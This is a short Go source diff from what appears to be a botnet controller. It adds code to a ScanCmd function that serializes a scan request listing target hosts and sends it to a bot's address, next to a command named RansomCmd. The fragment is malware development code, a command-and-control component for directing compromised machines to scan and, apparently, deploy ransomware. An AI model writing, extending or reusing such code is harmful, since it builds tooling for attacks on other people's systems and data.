@@ -6,7 +6,17 @@ import (
 
 //ScanCmd is
 func (c *CommanderService) ScanCmd(addr string) error {
-	return sendData(addr, commandToBytes("scan"))
+	botnet.Msg("sending scan request")
+	req := &scanRequest{
+		Type:  "simple",
+		Hosts: []string{"127.0.0.1"},
+	}
+	b, err := botnet.Bytes(req)
+	if err != nil {
+		return err
+	}
+	payload := append(commandToBytes("scan"), b...)
+	return sendData(addr, payload)
 }
 
 //RansomCmd is
